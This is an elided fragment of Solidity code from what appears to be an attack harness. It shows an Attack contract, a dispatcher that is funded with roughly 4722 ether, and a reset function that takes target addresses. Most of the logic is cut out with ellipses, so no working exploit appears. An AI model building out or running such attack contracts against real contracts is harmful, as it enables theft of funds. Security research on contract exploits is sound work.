 ...
 * parameter. Make sure to send at least 4722 ether and 366482869645213697 wei to the attack
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 4) {
                ...
                uint value = 0x1000000000000000000;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x1000000000000000001; /* equals 4722 ether and 366482869645213697 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[4] = new AttackDispatcher{value: 4722366482869645213696 }(4, _targets);
    }
